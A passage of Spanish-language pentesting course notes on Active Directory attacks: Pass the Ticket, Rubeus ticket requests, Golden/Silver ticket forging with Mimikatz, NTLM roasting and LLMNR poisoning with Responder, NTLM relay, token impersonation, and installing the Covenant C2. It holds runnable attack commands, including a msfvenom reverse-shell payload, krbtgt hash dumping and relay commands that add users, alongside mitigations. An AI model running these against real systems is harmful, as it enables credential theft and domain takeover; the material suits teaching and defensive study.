### 🛡️ ¿Cómo mitigar Pass The Ticket?

1. **Evita que cuentas privilegiadas inicien sesión en máquinas compartidas**.
2. **Aplica LSA Protection** para impedir lectura de `lsass`.
3. **Audita uso anómalo de tickets** con SIEMs y Defender for Identity.
4. **Reduce el tiempo de vida de tickets Kerberos** para que expiren más rápido.
5. **Segmentación de red y cuentas**: evita que el robo de un ticket comprometa todo el dominio.

---

### 📚 Resumen visual

| Técnica             | Usa contraseña | Usa NTLM hash | Usa ticket Kerberos | Protocolo |
| ------------------- | -------------- | ------------- | ------------------- | --------- |
| Pass The Hash       | ❌ No          | ✅ Sí         | ❌ No               | NTLM      |
| Over Pass The Hash  | ❌ No          | ✅ Sí         | ✅ Sí (genera TGT)  | Kerberos  |
| **Pass The Ticket** | ❌ No          | ❌ No         | ✅ Sí               | Kerberos  |

---

### 🧪 Bonus: Crear y usar ticket `.kirbi` falso (solo para laboratorio)

```powershell
Rubeus.exe tgtdeleg /ptt
```

Esto genera un TGT válido de tu usuario actual si tienes delegación habilitada.

---

[🔼](#índice)

---

## **319. ASK-TGT/TGS**

### 🧠 ¿Qué es ASKTGT / ASKTGS?

En el protocolo **Kerberos**, cuando un usuario quiere autenticarse y acceder a un servicio:

1. **ASKTGT** (Ask Ticket Granting Ticket):
   El cliente solicita un **TGT** (Ticket Granting Ticket) al **KDC (Key Distribution Center)**.
   Este TGT permite al cliente pedir otros tickets en el futuro sin volver a enviar su contraseña.

2. **ASKTGS** (Ask Ticket Granting Service):
   Usando el TGT, el cliente ahora puede pedir un **TGS** (Ticket Granting Service) para acceder a servicios específicos (como SMB, HTTP, LDAP, etc.).

🎯 En resumen:

| Acción   | Propósito                                               |
| -------- | ------------------------------------------------------- |
| `ASKTGT` | Obtener un TGT usando las credenciales                  |
| `ASKTGS` | Obtener un TGS usando un TGT para acceder a un servicio |

---

### 🧰 ¿Para qué sirve esto en pentesting?

- Enumerar servicios disponibles.
- Solicitar tickets para **Kerberoasting**.
- Inyectar TGTs para **Pass The Ticket**.
- Ver si un hash NTLM funciona (sin necesidad de contraseña).

---

### 🧾 ¿Qué se necesita?

- Un nombre de usuario y dominio.
- Una contraseña _o_ su hash NTLM.
- Herramientas como [`Rubeus`](https://github.com/GhostPack/Rubeus) o `Impacket`.

---

### 🧱 Instalación de Rubeus (Windows)

1. Descarga Rubeus desde:
   [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

2. Compila el proyecto en Visual Studio o usa binarios ya compilados desde repos como:
   [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

3. Coloca `Rubeus.exe` en tu máquina atacante o en la víctima.

---

### ⚙️ Ejemplo completo: Uso de ASKTGT y ASKTGS

#### 🧪 Escenario de laboratorio:

- Usuario: `gustavo`
- Dominio: `hack.local`
- NTLM hash: `aad3b435b51404eeaad3b435b51404ee:9b9a5e6cf8c0b0e76f3e5e82cba6e3e3`
- Servicio al que quieres acceder: `cifs/dc.hack.local`

---

#### ✅ Paso 1: ASKTGT – Solicitar un TGT con un hash NTLM

```powershell
Rubeus.exe asktgt /user:gustavo /domain:hack.local /rc4:9b9a5e6cf8c0b0e76f3e5e82cba6e3e3 /ptt
```

🔹 Opciones:

- `/user`: Nombre del usuario.
- `/domain`: Nombre del dominio.
- `/rc4`: Hash NTLM del usuario (también se puede usar `/password:`).
- `/ptt`: Inyecta el TGT directamente en la sesión.

✔️ Verifica el ticket:

```cmd
klist
```

Deberías ver un ticket de `krbtgt/hack.local`.

---

#### ✅ Paso 2: ASKTGS – Pedir un TGS para un servicio

```powershell
Rubeus.exe asktgs /service:cifs/dc.hack.local
```

🔹 Esto solicitará un ticket TGS para acceder al servicio SMB en el DC (`\\dc.hack.local\C$`).

✔️ Verifica de nuevo:

```cmd
klist
```

Verás 2 tickets: el TGT y el nuevo TGS para `cifs/dc.hack.local`.

---

#### ✅ Paso 3: Usar el TGS para conectarte

```cmd
dir \\dc.hack.local\C$
```

Si el usuario `gustavo` tiene permisos, tendrás acceso. ¡Sin haber ingresado su contraseña en ningún momento!

---

### 🚨 Bonus: ASKTGS para Kerberoasting

Si conoces el nombre de un **SPN**, puedes pedir el TGS y crackearlo con `hashcat`:

```powershell
Rubeus.exe asktgs /service:http/srv-web.hack.local /user:gustavo /rc4:<hash> /domain:hack.local
```

Luego extraes el ticket y lo crackeas.

---

### 🧪 Resumen visual:

```powershell
# Obtener un TGT (ASKTGT)
Rubeus.exe asktgt /user:gustavo /rc4:<hash> /domain:hack.local /ptt

# Obtener un TGS (ASKTGS)
Rubeus.exe asktgs /service:cifs/dc.hack.local
```

---

### 🛡️ Mitigación

- **Auditar solicitudes Kerberos inusuales.**
- **Aplicar políticas de contraseña robustas.**
- **Detectar uso repetido de SPNs con Defender o SIEMs.**
- **Deshabilitar cuentas no usadas o de servicios antiguos.**

---

[🔼](#índice)

---

## **320. Kerberos Golden Ticket y Silver Ticket**

### 🎭 ¿Qué es un Golden Ticket en Kerberos?

Un **Golden Ticket** es un **TGT falsificado** (Ticket Granting Ticket).
Permite a un atacante hacerse pasar por **cualquier usuario, incluso administrador**, dentro de un dominio de Active Directory (AD), sin importar su contraseña real.

> 🔥 Se llama "golden" porque te da acceso total al reino del AD.

---

### 📘 ¿Qué se necesita para crear un Golden Ticket?

1. Nombre del dominio (ej: `hack.local`)
2. SID del dominio (ej: `S-1-5-21-...`)
3. El hash **NTLM del usuario krbtgt** (clave secreta del KDC)
4. Nombre de usuario falso o real (ej: `gustavo`)
5. Herramienta como **Mimikatz**

---

### 🥈 ¿Qué es un Silver Ticket?

Un **Silver Ticket** es un **TGS falsificado** (Ticket Granting Service).
Te da acceso directo a **servicios específicos** (como CIFS, HTTP, LDAP) sin interactuar con el KDC.

> Ideal para ataques sigilosos, ya que **no genera registros en el controlador de dominio (DC)**.

---

### 🔧 Instalación de Mimikatz

1. Descarga compilados desde:

   [https://github.com/ParrotSec/mimikatz/releases](https://github.com/ParrotSec/mimikatz/releases)
   (o usa `Invoke-Mimikatz` si estás en PowerShell).

2. Ejecuta como administrador:

```cmd
mimikatz.exe
```

---

### 🛠️ Ejemplo completo: Golden Ticket

#### 🔍 Paso 1: Obtener los datos necesarios

Supongamos que ya comprometiste una máquina y extraes el hash del usuario `krbtgt`:

```powershell
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

Guarda:

- Dominio: `hack.local`
- SID: `S-1-5-21-1234567890-2345678901-3456789012`
- Hash NTLM de `krbtgt`: `cc33fdc91d9f7f1abecaf1d01273b61c`
- Usuario objetivo: `gustavo`

---

#### 🔐 Paso 2: Crear el Golden Ticket

```mimikatz
kerberos::golden /user:gustavo /domain:hack.local /sid:S-1-5-21-1234567890-2345678901-3456789012 /krbtgt:cc33fdc91d9f7f1abecaf1d01273b61c /groups:512 /ptt
```

- `groups:512` te pone como **Administrador de dominio**.
- `/ptt`: inyecta el ticket en memoria.

✔️ Verifica con:

```cmd
klist
```

---

#### 🧪 Paso 3: Accede a recursos protegidos

```cmd
dir \\dc.hack.local\c$
```

¡Acceso completo! Aunque no tengas la contraseña real.

---

### 🛠️ Ejemplo completo: Silver Ticket

#### 🔍 ¿Qué necesitas?

- Nombre del dominio y SID
- Nombre del **servicio SPN** (ej: `cifs/dc.hack.local`)
- Hash NTLM del servicio (no de `krbtgt`, sino del **cuenta de servicio** como `svc-sql` o `computer$`)

Supón:

- Servicio: `cifs/dc.hack.local`
- Cuenta de servicio: `dc$`
- Hash NTLM: `aabbccddeeff00112233445566778899`

---

#### 🔐 Crear Silver Ticket

```mimikatz
kerberos::golden /user:gustavo /domain:hack.local /sid:S-1-5-21-1234567890-2345678901-3456789012 /target:cifs/dc.hack.local /rc4:aabbccddeeff00112233445566778899 /service:cifs /ptt
```

✔️ Verifica:

```cmd
klist
```

Ahora puedes conectarte solo al servicio `cifs` del servidor `dc`.

---

### 🧠 Diferencias clave

|                 | Golden Ticket            | Silver Ticket       |
| --------------- | ------------------------ | ------------------- |
| Tipo de ticket  | TGT                      | TGS                 |
| Se falsifica... | krbtgt                   | Cuenta de servicio  |
| Alcance         | Acceso a todo el dominio | Acceso a 1 servicio |
| Detectabilidad  | Más detectable (logs DC) | Menos detectable    |
| Herramienta     | Mimikatz                 | Mimikatz            |

---

### 🔐 Protección contra estos ataques

- Rotar periódicamente la contraseña de `krbtgt` (2 veces seguidas).
- Activar **log de eventos 4769** y usar un SIEM.
- Usar **Windows Defender Credential Guard**.
- Restringir privilegios de cuentas de servicio.

---

### ✅ Resumen práctico

```bash
# Golden Ticket
kerberos::golden /user:hacker /domain:hack.local /sid:S-1-5... /krbtgt:<hash> /groups:512 /ptt

# Silver Ticket
kerberos::golden /user:hacker /domain:hack.local /sid:S-1-5... /rc4:<svc-hash> /service:cifs /target:dc.hack.local /ptt
```

---

[🔼](#índice)

---

## **321. NTLM Roasting**

### 🧠 ¿Qué es NTLM Roasting?

**NTLM Roasting** es un ataque que consiste en **capturar hashes NTLMv1 o NTLMv2** de autenticación que pasan por la red (por ejemplo, con SMB o HTTP), y luego **crackearlos fuera de línea** para recuperar las contraseñas.

> A diferencia de Kerberoasting (que abusa de Kerberos), NTLM Roasting se basa en **NTLM (NT LAN Manager)**, un protocolo de autenticación heredado, aún muy usado.

---

### 📌 ¿Cómo funciona NTLM Roasting?

1. El atacante convence a una máquina o usuario del dominio para que **se autentique** contra un servidor **controlado o falso**.
2. Durante la autenticación NTLM, la víctima **envía su nombre de usuario y un hash NTLMv2**.
3. El atacante **captura ese hash** y lo usa con herramientas como **Hashcat** o **John the Ripper** para **crackear la contraseña**.

---

### 💡 ¿Cuándo es útil?

Cuando:

- No hay Kerberos disponible o el objetivo lo desactiva.
- Hay cuentas que autentican mediante NTLM (SMB, HTTP, LDAP sin cifrar).
- El atacante está en **posición de red favorable** (ej: red interna o acceso RDP).

---

### 🎯 ¿Qué necesitas?

- Un entorno con máquinas Windows unidas a un dominio AD.
- Herramientas como:

  - `Responder`
  - `Inveigh`
  - `Impacket`
  - `Hashcat` o `John the Ripper` para crackear

---

### ⚙️ Instalación de herramientas

### 🔧 1. Instalar **Responder** en Kali Linux:

```bash
sudo apt update
sudo apt install responder
```

#### 🔧 2. Instalar **Impacket** (por si usas `ntlmrelayx.py`)

```bash
sudo apt install impacket-scripts
```

---

### 🧪 Ejemplo completo: NTLM Roasting en laboratorio

#### 🔐 Escenario:

- Tienes acceso a la misma red que las víctimas (por ejemplo, estás en una red corporativa interna).
- Tu Kali Linux está en la misma red que un Windows unido al dominio.
- Objetivo: capturar un hash NTLMv2 y crackearlo.

---

#### 🛰️ Paso 1: Ejecutar Responder

```bash
sudo responder -I eth0
```

> `eth0` es tu interfaz de red (verifícalo con `ip a`)

Responder se encargará de **responder a solicitudes de nombres como LLMNR, NetBIOS o mDNS** y capturar hashes NTLMv2.

---

#### 💡 Paso 2: Esperar que alguien acceda a un recurso (SMB)

Por ejemplo, si un usuario intenta acceder a:

```
\\10.10.10.100\compartido
```

Responder responderá y capturará el hash:

```
[+] NTLMv2-SSP Hash     : gustavo::HACK.LOCAL:1122334455667788...
```

---

#### 🔓 Paso 3: Crackear el hash con Hashcat

Guarda el hash en un archivo, por ejemplo `hashes.txt`, y usa:

```bash
hashcat -m 5600 -a 0 hashes.txt rockyou.txt
```

- `-m 5600`: modo NTLMv2
- `-a 0`: ataque por diccionario
- `rockyou.txt`: archivo de contraseñas comunes

✔️ Si la contraseña es débil, la recuperarás en segundos.

---

### 🛡️ Cómo defenderse del NTLM Roasting

1. **Deshabilita LLMNR y NetBIOS en todas las máquinas.**
2. **Forzar el uso de Kerberos y deshabilitar NTLM** donde sea posible.
3. Usa **contraseñas largas y únicas** (evita contraseñas del tipo `P@ssw0rd123`).
4. Usa **protecciones como Windows Defender Credential Guard**.
5. Segmentar la red y evitar que usuarios normales tengan visibilidad entre máquinas.

---

### ✅ Resumen

| Concepto             | Explicación rápida                                         |
| -------------------- | ---------------------------------------------------------- |
| Protocolo explotado  | NTLM (autenticación heredada de Windows)                   |
| Hash capturado       | NTLMv2 (desde SMB, HTTP, etc.)                             |
| Herramientas comunes | Responder, Inveigh, Impacket                               |
| Método de ataque     | Capturar hash → crackear con Hashcat o John                |
| Defensa recomendada  | Desactivar NTLM, LLMNR, NetBIOS y usar contraseñas fuertes |

---

[🔼](#índice)

---

## **322. LLMNR/NBTNS Poisoning**

### 🔍 ¿Qué es LLMNR/NBT-NS Poisoning?

**LLMNR (Link-Local Multicast Name Resolution)** y **NBT-NS (NetBIOS Name Service)** son protocolos usados por Windows para **resolver nombres de red** cuando DNS no responde o no encuentra un nombre.

**El problema** es que:

- No están autenticados.
- Cualquier equipo en la red puede responder.
- Permiten a un atacante suplantar servidores y capturar credenciales.

🎯 **El ataque**: El atacante **finge ser un servidor** al que el usuario intenta conectarse, y **captura el hash NTLMv2** del usuario.

---

### 🧠 ¿Cómo funciona el ataque?

1. Un usuario trata de acceder a un recurso que no existe (ej: `\\servidor_inexistente\carpeta`).
2. Windows intenta resolver el nombre vía **LLMNR/NBT-NS**.
3. El atacante responde como si fuera ese servidor.
4. Windows envía automáticamente **sus credenciales NTLMv2**.
5. El atacante captura el hash para **crackearlo offline** o usarlo en **ataques Pass-the-Hash**.

---

### 📌 Herramienta más usada: **Responder**

Una herramienta escrita en Python para Linux que:

- Responde a LLMNR y NBT-NS.
- Captura hashes.
- Simula servidores SMB, HTTP, LDAP, etc.

---

### ⚙️ Instalación de Responder

En Kali Linux ya viene instalada. Si no, instala así:

```bash
sudo apt update
sudo apt install responder
```

Para otras distros:

```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
sudo pip3 install -r requirements.txt
```

---

### 🧪 Ejemplo completo paso a paso

#### 🧑‍💻 Entorno de laboratorio

- Kali Linux (Atacante)
- Windows 10 (Víctima) unida a una red virtual o física

#### 📡 Paso 1: Verifica tu interfaz de red

```bash
ip a
```

Ejemplo de interfaz: `eth0`, `ens33`, `wlan0`, etc.

#### 🚀 Paso 2: Ejecuta Responder

```bash
sudo responder -I eth0
```

> Sustituye `eth0` por tu interfaz de red.

Responder empieza a escuchar tráfico LLMNR, NBT-NS y mDNS.

#### 🎯 Paso 3: Provoca una resolución de nombre fallida en la víctima

Desde la máquina Windows:

```cmd
\\inexistente\recurso
```

Este intento fallido activará la búsqueda LLMNR/NBT-NS.

Responder capturará algo como:

```plaintext
[+] NTLMv2-SSP Hash     : usuario::DOMINIO:1234567890ABCDEF...
```

¡Hash capturado con éxito!

---

#### 🔓 Paso 4: Crackear el hash con Hashcat

1. Guarda el hash en `hashes.txt`.

2. Usa Hashcat con el diccionario RockYou:

```bash
hashcat -m 5600 -a 0 hashes.txt rockyou.txt
```

> `-m 5600` es el modo para NTLMv2

---

### ✅ Resumen visual

```plaintext
┌────────────┐          LLMNR/NBT-NS         ┌────────────┐
│  Windows   │ ────────────────►────────────►│ Attacker   │
│  víctima   │      (name query)            │  (Responder)│
└────────────┘                               └────────────┘
         ▲                                           │
         └───────── hash NTLMv2 capturado ◄──────────┘
```

---

### 🛡️ ¿Cómo prevenir este ataque?

**¡Desactiva LLMNR y NBT-NS en tu red!**

#### Desactivar LLMNR en Windows:

1. Abrir `gpedit.msc`.
2. Navegar a:

   ```
   Computer Configuration > Administrative Templates > Network > DNS Client
   ```

3. Activar: `Turn Off Multicast Name Resolution`

#### Desactivar NetBIOS:

1. Ir a:

   ```
   Panel de control > Centro de redes > Adaptador > Propiedades > IPv4 > Avanzado > WINS
   ```

2. Seleccionar: `Deshabilitar NetBIOS sobre TCP/IP`

---

### 🧪 Extra: Automatizar con Inveigh (alternativa en PowerShell)

Si estás en una máquina Windows comprometida, puedes usar [Inveigh](https://github.com/Kevin-Robertson/Inveigh):

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh
```

---

### 🚨 Importante

- Este ataque **no requiere credenciales previas**, solo estar en la misma red.
- Es muy efectivo en redes corporativas que aún usan LLMNR/NBT-NS.
- Se puede combinar con ataques como **Pass-the-Hash** o **NTLM relay**.

---

[🔼](#índice)

---

## **323. NTLM/SMB Relay**

### 🧠 ¿Qué es NTLM Relay?

**NTLM Relay** es un ataque en el que un atacante **captura una autenticación NTLM legítima** (normalmente de SMB o HTTP) y **la reenvía (relay)** a otro servicio en la red para **autenticarse como la víctima**.

---

### 📌 ¿Por qué funciona?

Porque:

- NTLM no vincula la autenticación al origen.
- Muchos servicios de Windows permiten NTLM sin restringir el origen del mensaje.
- A menudo, los servicios no requieren **firma SMB (SMB signing)**, lo que facilita la manipulación del tráfico.

---

### 📸 Escenario típico:

```plaintext
[Usuario] → pide un recurso → [Atacante] (Responder)
                     ↓ Relay
               [Servidor de archivos (victima 2)]
```

- Usuario intenta conectarse a `\\servidor_inexistente`.
- Atacante con **Responder** finge ser el servidor.
- Usuario envía **hash NTLM**.
- Atacante usa **ntlmrelayx** para reenviar ese hash a otro servidor (por ejemplo, SMB o LDAP).
- Si la víctima tiene permisos, ¡el atacante accede como él!

---

### 🔧 Herramientas necesarias

- **Responder**: Para interceptar peticiones LLMNR/NBT-NS.
- **ntlmrelayx.py** (de Impacket): Para hacer el relay de la autenticación capturada.

---

### 🛠️ Instalación

#### ✅ 1. Instala Impacket

En Kali Linux ya está instalado, pero para instalar o actualizar manualmente:

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .
```

---

#### ✅ 2. Instala Responder

```bash
sudo apt install responder
```

O manual:

```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
```

---

### 🚀 Laboratorio de ejemplo: NTLM Relay a SMB

#### 🧪 Entorno:

- **Kali Linux** (Atacante)
- **Windows 10** (Víctima)
- **Windows Server** (Objetivo del relay, con compartidos SMB o LDAP)

> Las 3 máquinas deben estar en la misma red o segmento virtual (como VirtualBox o VMware NAT o red interna).

---

### 📍 Paso 1: Detén Responder (para que no intercepte SMB)

```bash
cd Responder
sudo ./Responder.py -I eth0 -wrf
```

> Usa `-wrf` para evitar que Responder intercepte SMB. Solo interceptará LLMNR/NBT-NS y dejará libre el SMB para ntlmrelayx.

---

### 📍 Paso 2: Ejecuta ntlmrelayx

Usaremos ntlmrelayx para **retransmitir autenticaciones NTLM a un servidor SMB vulnerable** (sin SMB signing).

```bash
sudo ntlmrelayx.py -t smb://192.168.1.50 -smb2support --no-http-server
```

Explicación:

- `-t`: objetivo (servidor vulnerable donde haremos relay).
- `--no-http-server`: evita iniciar el servidor HTTP de ntlmrelayx si no lo necesitas.
- `-smb2support`: activa soporte para SMBv2.

📌 _Puedes usar también LDAP o múltiples objetivos:_

```bash
sudo ntlmrelayx.py -tf targets.txt
```

Contenido de `targets.txt`:

```
smb://192.168.1.50
ldap://192.168.1.51
```

---

### 📍 Paso 3: Provoca autenticación NTLM

En la máquina Windows víctima:

```cmd
\\servidor_inexistente
```

Windows tratará de resolver el nombre, Responder atrapará la petición y **ntlmrelayx la reenviará** al servidor SMB.

---

### ✅ Si el relay funciona...

- ntlmrelayx imprimirá algo como:

```bash
[+] SMB relay success! User: VICTIMA\juan
[+] Dumping shares or executing commands...
```

- Puede crear un **usuario remoto** o abrir una **shell con privilegios** si el usuario tiene permisos suficientes.

---

### 🎯 Ejemplo completo con creación de usuario remoto

Si la víctima es **admin en el servidor destino**, puedes usar:

```bash
sudo ntlmrelayx.py -t smb://192.168.1.50 -smb2support --no-http-server --add-user relayuser --add-computer
```

Esto intentará:

- Agregar un nuevo usuario `relayuser`.
- Agregar un equipo al dominio (si es contra LDAP).

---

### 🧱 ¿Cómo protegerse?

1. **Desactivar LLMNR y NetBIOS**.
2. **Activar SMB signing obligatorio**:

   - En GPO: `Network security: Digitally sign communications (always)` → Activado.

3. Usar **Kerberos** y desactivar NTLM si es posible.
4. **Monitorear autenticaciones SMB/NTLM sospechosas**.

---

### 📚 Resumen rápido

| Elemento        | Descripción                                        |
| --------------- | -------------------------------------------------- |
| ❓ Qué es       | Ataque que captura y reenvía autenticaciones NTLM  |
| 🧰 Herramientas | Responder + ntlmrelayx                             |
| 🎯 Objetivo     | Acceder a otros servicios como la víctima          |
| ⚠️ Riesgo       | Muy alto si NTLM y SMB sin firma están habilitados |
| 🛡️ Mitigación   | Desactivar LLMNR/NetBIOS, forzar SMB signing       |

---

[🔼](#índice)

---

## **324. Token impersonation**

### 🧠 ¿Qué es Token Impersonation?

**Token Impersonation** es una técnica de **post-explotación** utilizada principalmente en sistemas Windows para **elevar privilegios** o **moverse lateralmente** dentro de una red.

El atacante **"se disfraza" del token de otro usuario**, normalmente uno con privilegios más altos (como un administrador), y ejecuta comandos **con los permisos de esa persona**, sin necesidad de conocer su contraseña.

---

### 📌 ¿Qué es un "token"?

En Windows, cuando un usuario inicia sesión, se le asigna un **token de acceso**. Este token contiene:

- El ID del usuario
- Grupos a los que pertenece
- Permisos
- SID del dominio

Este token se utiliza para verificar si el usuario puede acceder a archivos, servicios, ejecutar comandos, etc.

---

#### 🔓 ¿Por qué es peligroso?

Porque un atacante con acceso local puede:

- Enumerar tokens de otros procesos
- Clonarlos o secuestrarlos
- Ejecutar comandos **como si fuera** un administrador

---

### 📦 Tipos de token impersonation

1. **Impersonación local (local privilege escalation)**

   El atacante suplantando a un proceso con más privilegios (como SYSTEM o administrador) desde la misma máquina.

2. **Impersonación remota / delegación**

   Cuando un token es delegado a una máquina por un servicio (ej. en redes AD) y puede ser reutilizado para moverse lateralmente.

---

#### 🛠️ Herramientas más usadas

- [**Incognito**](https://github.com/m0n0ph1/Incognito) (antigua, en Meterpreter)
- [**Rubeus**](https://github.com/GhostPack/Rubeus) (C#)
- [**Impacket**](https://github.com/fortra/impacket) (`psexec.py`, `wmiexec.py`)
- **mimikatz** 💥 (la más usada)
- PowerShell (`Invoke-TokenManipulation.ps1`)

---

### 📲 Instalación de Mimikatz

En Kali Linux:

```bash
sudo apt install mingw-w64
git clone https://github.com/gentilkiwi/mimikatz.git
cd mimikatz/mimikatz
```

Luego compilas en Windows o usas una versión precompilada.

---

### ✅ Uso básico con mimikatz

> Requiere privilegios de **Administrador** para funcionar.

1. Abre una consola de **Administrador**.
2. Ejecuta mimikatz.

```cmd
privilege::debug
token::list
```

Esto lista los tokens activos. Luego puedes impersonar uno:

```cmd
token::elevate
```

Si el token tiene privilegios, ahora **tienes acceso como ese usuario**.

---

### 🧪 Laboratorio: Token Impersonation con mimikatz

#### 🔧 Escenario:

- Una máquina Windows 10.
- Un usuario atacante con acceso limitado.
- Un proceso corriendo con permisos de **Administrador**.

---

#### 🔹 Paso 1: Consigue acceso al sistema (por ejemplo con Meterpreter o una shell remota)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
```

Ejecútala en la máquina víctima.

---

#### 🔹 Paso 2: Abre mimikatz y enumera tokens

```cmd
privilege::debug
token::list
```

Salida típica:

```txt
Token Id  : 0
User name : NT AUTHORITY\SYSTEM
```

---

#### 🔹 Paso 3: Suplanta el token

```cmd
token::elevate
```

Verás algo como:

```txt
[+] Token impersonation successful (now running as SYSTEM)
```

---

#### 🔹 Paso 4: Verifica

```cmd
whoami
```

```txt
nt authority\system
```

¡Listo! Ahora tienes el máximo nivel de privilegio.

---

### 🎯 Caso de uso real en pentesting

1. Ganas acceso limitado a una máquina.
2. Enumeras procesos que corren como admin (con `mimikatz`, `process hacker`, `tasklist`, etc).
3. Usas `mimikatz` para robar su token.
4. Lo suplantas y accedes a archivos, o usas ese token para moverte lateralmente.

---

### 🛡️ ¿Cómo protegerse?

| Mitigación                                  | Explicación                                      |
| ------------------------------------------- | ------------------------------------------------ |
| Desactivar **token delegación innecesaria** | En GPOs                                          |
| Evitar cuentas con sesión activa permanente | Evita que un token admin quede expuesto          |
| Uso de **Credential Guard**                 | Evita exposición de tokens                       |
| Separar privilegios                         | Usar cuentas de admins solo cuando sea necesario |
| Endpoint Detection & Response (EDR)         | Detecta el uso de mimikatz/token theft           |

---

### 📚 Resumen

| Elemento    | Descripción                                                   |
| ----------- | ------------------------------------------------------------- |
| Qué es      | Técnica para hacerse pasar por otro usuario mediante su token |
| Herramienta | Mimikatz, Rubeus, PowerView                                   |
| Privilegios | Necesitas acceso de administrador                             |
| Propósito   | Escalada de privilegios, movimiento lateral                   |
| Riesgo      | Muy alto en redes mal configuradas                            |

---

[🔼](#índice)

---

## **325. Problemas y errores instalación Covenant**

### 🛠️ ¿Qué es Covenant?

**Covenant** es un **C2 (Command & Control)** moderno, desarrollado en .NET Core, usado por **red teamers y pentesters** para controlar implantes (agents) en máquinas comprometidas. Su interfaz web y funciones avanzadas (criptografía, ejecución en memoria, etc.) lo hacen muy poderoso.

---

### 📦 Requisitos para instalar Covenant

| Requisito       | Descripción                                  |
| --------------- | -------------------------------------------- |
| .NET SDK        | .NET Core SDK 3.1 (recomendado) o superior   |
| PowerShell Core | Módulos necesarios para interacción          |
| Git             | Para clonar el repositorio                   |
| Linux o Windows | Puede instalarse en ambos (se prefiere Kali) |

---

### 🧱 Instalación básica paso a paso (en Kali Linux)

```bash
sudo apt update
sudo apt install git dotnet-sdk-6.0 -y
```

> ⚠️ Covenant está diseñado con **.NET Core 3.1**, pero puede funcionar con 6.0. Si quieres máxima compatibilidad, usa 3.1.

```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet build
```

Luego ejecutas con:

```bash
dotnet run
```

---

### ⚠️ Problemas comunes al instalar Covenant y cómo solucionarlos

---

#### ❌ 1. Error: `error NU1101: Unable to find package Microsoft.AspNetCore.App`

##### ✅ Solución:

Necesitas instalar el runtime de ASP.NET Core:

```bash
sudo apt install aspnetcore-runtime-6.0
```

También asegúrate de tener el SDK correspondiente:

```bash
sudo apt install dotnet-sdk-6.0
```

---

#### ❌ 2. Error: `dotnet: command not found`

##### ✅ Solución:

.NET no está instalado o mal configurado. Puedes agregarlo:

```bash
wget https://packages.microsoft.com/config/debian/11/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update
sudo apt install dotnet-sdk-6.0
```

Verifica:

```bash
dotnet --version
```

---

#### ❌ 3. Error: `System.IO.FileNotFoundException` (al iniciar)

Esto ocurre si no estás en la carpeta correcta o los submódulos de git no fueron descargados.

##### ✅ Solución:

```bash
git submodule update --init --recursive
```

Y asegúrate de estar en:

```bash
cd Covenant/Covenant
```

---

#### ❌ 4. Problemas de permisos de puertos (por defecto usa 7443)

##### ✅ Solución:

Si tienes conflictos con ese puerto:

- Cámbialo en el archivo de configuración (`appsettings.json`).
- O simplemente prueba con otro puerto:

```bash
dotnet run --urls "http://0.0.0.0:8080"
```

---

#### ❌ 5. Acceso denegado al cargar módulos (como Grunt, Launchers)

Esto ocurre cuando falta configurar correctamente el **listener**.

##### ✅ Solución:

- Crea un listener HTTPS desde la interfaz web.
- Luego crea un “Grunt” (agente).
- Usa un launcher (como PowerShell o .bat) para conectarlo.

---

#### 🧪 Ejemplo completo funcional (Kali Linux)

##### 1. Instala dependencias:

```bash
sudo apt install git dotnet-sdk-6.0 aspnetcore-runtime-6.0 -y
```

##### 2. Clona Covenant:

```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
```

##### 3. Compila y ejecuta:

```bash
dotnet build
dotnet run
```

Te mostrará:

```
Now listening on: https://0.0.0.0:7443
```

Abre tu navegador en:

```
https://127.0.0.1:7443
```

✔️ Usa el navegador **Firefox** (ignora el error SSL).

---

##### 4. Crea usuario y accede al panel web

1. Registra un nuevo usuario.
2. Crea un **Listener HTTPS**.
3. Genera un **Grunt Launcher (PowerShell)**.
4. Ejecuta el launcher en una víctima Windows.
5. El **Grunt aparecerá conectado** en la interfaz de Covenant.

---

### ✅ Consejo final

Si Covenant no inicia por errores del .NET SDK, siempre revisa:

```bash
dotnet --list-sdks
```

Y elimina versiones conflictivas si es necesario.

---

[🔼](#índice)

---

## **326. Frameworks de postexplotación: Covenant**

### 🧠 ¿Qué es Covenant?

**Covenant** es un **framework de post-explotación y C2 (Command and Control)** escrito en **.NET Core**, creado por **Ryan Cobb**. Es usado por equipos de Red Team para controlar sistemas comprometidos de forma sigilosa.

> En otras palabras: Covenant te permite **tomar el control remoto** de una máquina (como si fuera una "backdoor avanzada") y **administrarla desde una interfaz web** segura.

---

### 🎯 ¿Para qué sirve Covenant?

Con Covenant puedes:

- Crear **Grunts** (agentes maliciosos) que se conectan a tu servidor.
- Ejecutar comandos remotamente (PowerShell, cmd, etc.).
- Realizar tareas como keylogging, ejecución en memoria, volcado de credenciales, escalada de privilegios, etc.
- **Automatizar ataques post-explotación**.

---

### 🏗️ Arquitectura general

1. **Covenant (servidor):** El C2. Tú lo instalas en tu máquina (Kali, Ubuntu o Windows).
2. **Grunt (agente):** Se instala en la víctima y se conecta al Covenant.
3. **Listener:** Puerto/servicio usado para recibir la conexión del Grunt.
4. **Launchers:** Script que inyectas en la víctima (PowerShell, bat, etc.).

---

### 💻 Instalación de Covenant (paso a paso) en Kali Linux

#### 📌 Requisitos:

- Kali Linux actualizado.
- .NET SDK (versión 6.0 o 3.1).
- Git instalado.

---

#### 1. Instalar dependencias necesarias:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install git dotnet-sdk-6.0 aspnetcore-runtime-6.0 -y
```

Verifica instalación de .NET:

```bash
dotnet --version
```

---

#### 2. Clonar Covenant desde GitHub:

```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
```

---

#### 3. Compilar Covenant:

```bash
dotnet build
```

Si no hay errores, inicia:

```bash
dotnet run
```

Verás algo como:

```
Now listening on: https://0.0.0.0:7443
```

---

#### 4. Abrir Covenant en el navegador

Abre Firefox y ve a:

```
